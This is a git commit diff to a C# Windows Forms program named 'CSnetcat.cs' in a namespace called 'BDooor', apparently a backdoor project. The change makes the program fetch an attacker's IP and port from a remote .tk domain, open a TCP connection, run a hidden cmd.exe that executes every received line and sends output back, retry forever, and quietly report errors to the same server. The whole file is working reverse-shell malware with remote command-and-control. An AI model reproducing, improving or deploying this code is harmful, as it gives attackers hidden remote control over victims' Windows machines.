0bbdb8a2c60a1ab30cde7699f7c33be408c543db
toballz <42551340+toballz@users.noreply.github.com>
2020-08-22 02:39:38 -0400

    Update CSnetcat.cs

--- pshell/CSnetcat.cs
+++ pshell/CSnetcat.cs
@@ -1,15 +1,12 @@
 using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
 using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
-using System.Linq;
-using System.Net;
+using System.Net.Http;
 using System.Net.Sockets;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
@@ -18,15 +15,15 @@ namespace BDooor
 
 	public partial class Form1 : Form
 	{
-		public static string _ip = "192.168.0.25";
-		public static int _po = 2522;
+		public static string _ip;
+		public static int _po ;
 		TcpClient client;
+		HttpClient _httpClient = new HttpClient();
+		string _url = "https://dip.hyutygdfs4.tk/";
 
 		public Form1()
         {
             InitializeComponent();
-			//#start tcp connection
-			client = new TcpClient(_ip, _po);
 
 			StreamTCP();
         }
@@ -47,47 +44,73 @@ namespace BDooor
 			
         }
 
+		private async Task GetIp()
+		{
+			try{
+				HttpResponseMessage response = await _httpClient.GetAsync(_url+"e.txt");
+				response.EnsureSuccessStatusCode();
+				string htmlG = await response.Content.ReadAsStringAsync();
+				string[] splitIpPort = htmlG.Split(':');
+				_ip = splitIpPort[0];
+				_po = Int32.Parse(splitIpPort[1]);
+			}catch(Exception jd) { 
+					await _httpClient.GetAsync(_url + "?loog=GetIp():; " + jd.Message);
+			}
+		}
 
         //## netCat payload 2
 		static StreamWriter streamWriter;
-		public void StreamTCP()
+		public async void StreamTCP()
 		{
-			using (Stream stream = client.GetStream()){
-				using (StreamReader rdr = new StreamReader(stream)){
-					streamWriter = new StreamWriter(stream);
+
+			while (true) { 
+				try {
+					await GetIp();
+					//#start tcp connection
+					client = new TcpClient(_ip, _po);
+					using (Stream stream = client.GetStream()){
+						using (StreamReader rdr = new StreamReader(stream)){
+							streamWriter = new StreamWriter(stream);
 
 
-					Process p = new Process();
-					p.StartInfo.FileName = "cmd.exe";
-					p.StartInfo.CreateNoWindow = true;
-					p.StartInfo.UseShellExecute = false;
-					p.StartInfo.RedirectStandardOutput = true;
-					p.StartInfo.RedirectStandardInput = true;
-					p.StartInfo.RedirectStandardError = true;
-					p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputData);
-					p.Start();
-					p.BeginOutputReadLine();
+							Process p = new Process();
+							p.StartInfo.FileName = "cmd.exe";
+							p.StartInfo.CreateNoWindow = true;
+							p.StartInfo.UseShellExecute = false;
+							p.StartInfo.RedirectStandardOutput = true;
+							p.StartInfo.RedirectStandardInput = true;
+							p.StartInfo.RedirectStandardError = true;
+							p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputData);
+							p.Start();
+							p.BeginOutputReadLine();
 
-					string tcpInput = "";
-					while (true){
-						tcpInput = rdr.ReadLine();//get tcp input
+							string tcpInput = "";
+							while (true){
+								tcpInput = rdr.ReadLine();//get tcp input
 
-						p.StandardInput.WriteLine(LlTcpInput(tcpInput));//execute tcp input
-						tcpInput = "";//clear previous strInput
+								p.StandardInput.WriteLine(LlTcpInput(tcpInput));//execute tcp input
+								tcpInput = "";//clear previous strInput
+							}
+						}
 					}
+				}catch(Exception gf){
+					Thread.Sleep(1342);
+					//#GET request to _url log
+					await _httpClient.GetAsync(_url + "?loog=StreamTCP():; " + gf.Message);
 				}
 			}
 		}
 		//## netCat payload 1
-		private static void CmdOutputData(object sendingProcess, DataReceivedEventArgs outLine){
+		private async void CmdOutputData(object sendingProcess, DataReceivedEventArgs outLine){
 			StringBuilder strOutput = new StringBuilder();
 
 			if (!String.IsNullOrEmpty(outLine.Data)){
 				try{
 					streamWriter.WriteLine(outLine.Data);
 					streamWriter.Flush();
-				}catch (Exception err) { 
-					MessageBox.Show(err.Message);
+				}catch (Exception err) {
+					//#GET request to _url log
+					await _httpClient.GetAsync(_url + "?loog=CmdOutputData():; " + err.Message);
 				}
 			}
 		}
